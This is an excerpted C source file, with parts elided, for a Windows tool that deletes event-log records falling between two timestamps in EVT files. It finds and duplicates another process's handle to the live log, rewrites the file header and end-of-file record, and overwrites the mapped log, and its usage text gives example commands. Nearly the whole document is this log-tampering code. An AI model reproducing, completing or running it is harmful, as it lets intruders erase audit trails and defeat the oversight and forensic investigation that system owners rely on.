...
PVOID DeleteRecord(PVOID mapAddress, int len, char *StartTime, char *EndTime)
{
	...
	oldnum = currentRecordPtr->RecordNumber;
	//copy file header
	...
	evtFilePtr->CurrentRecordNumber = prevRecordPtr->RecordNumber + 1;
	evtFilePtr->OldestRecordNumber = oldnum;
	evtFilePtr->MaxSize = TempLen + 0x28;
	evtFilePtr->Flags = 0;
	memcpy(NewBuf, mapAddress, 0x30);

	//reset eof
	evtEOFPtr->EndRecord = TempLen;
	evtEOFPtr->CurrentRecordNumber = evtEOFPtr->CurrentRecordNumber - flag;
	memcpy(NewBuf + TempLen, evtEOFPtr, 0x28);

	Newlen = TempLen + 0x28;

	FILE* fp2;
	int err = fopen_s(&fp2, "c:\\test\\sys2.evt", "wb+");
	if (err != 0)
	{
		printf("createfile error!");
		return 0;
	}
	fwrite(NewBuf, Newlen, 1, fp2);
	fclose(fp2);

	memcpy(mapAddress, NewBuf, len);
	return mapAddress;
}

BOOL DeleteRecordMain(HANDLE fileHandle, char *StartTime, char *EndTime)
{
	...
	mapAddress = DeleteRecord(mapAddress, len, StartTime, EndTime);

	FILE* fp3;
	int err = fopen_s(&fp3, "c:\\test\\sys3.evt", "wb+");
	if (err != 0)
	{
		printf("createfile error!");
		return 0;
	}
	fwrite(mapAddress, len, 1, fp3);
	fclose(fp3);
...
int main(int argc, char *argv[])
{
	...
	printf("\nI can remove individual lines from Windows Event Viewer Log (EVT) files\n");
	printf("Support:WinXP and later\n");
	printf("Usage:\n");
	printf("     %s <absolute or relative file path> <flag> <StartTime> <EndTime>\n", argv[0]);
	printf("If flag=0: \n     Enumerate all processes and get specified file's handle.\n");
	printf("If flag=1: \n     Delete specified evt file's eventlog record.You need to set StartTime and EndTime\n");
	printf("eg:\n");
	printf("     %s sysevent.evt 0\n", argv[0]);
	printf("     %s sysevent.evt 1 \"2018-7-16 17:46:17\" \"2018-7-16 17:46:40\"\n", argv[0]);

	if ((argc == 3) && (memcmp(argv[2], "0", 1) == 0))
		printf("[*]Try to enumerate all processes and get <%s>'s handle.\n", argv[1]);
	else if ((argc == 5) && (memcmp(argv[2], "1", 1) == 0))
	{
				...
				if (wcsstr(objectName.Buffer, buf1) != 0)
				{
					...
					if (memcmp(argv[2], "1", 1) == 0)
					{
						...
						if (DuplicateHandle(processHandle, handle->HandleValue, GetCurrentProcess(), &dupHandle, 0, 0, DUPLICATE_SAME_ACCESS))
						{
							...
							if (DeleteRecordMain(dupHandle, argv[3], argv[4]) == 0)
								printf("done.\n");
